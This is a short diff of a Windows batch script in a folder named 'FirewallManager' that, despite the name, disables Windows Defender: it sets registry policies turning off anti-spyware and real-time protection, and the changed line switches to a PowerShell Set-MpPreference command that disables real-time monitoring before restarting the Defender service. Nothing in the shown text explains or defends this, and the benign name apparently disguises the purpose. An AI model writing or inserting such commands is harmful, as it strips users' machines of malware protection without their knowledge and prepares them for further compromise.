@@ -4,7 +4,7 @@ mkdir FirewallManager
 cd FirewallManager
 color a
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 net stop WinDefend
 net start WinDefend
 cls 
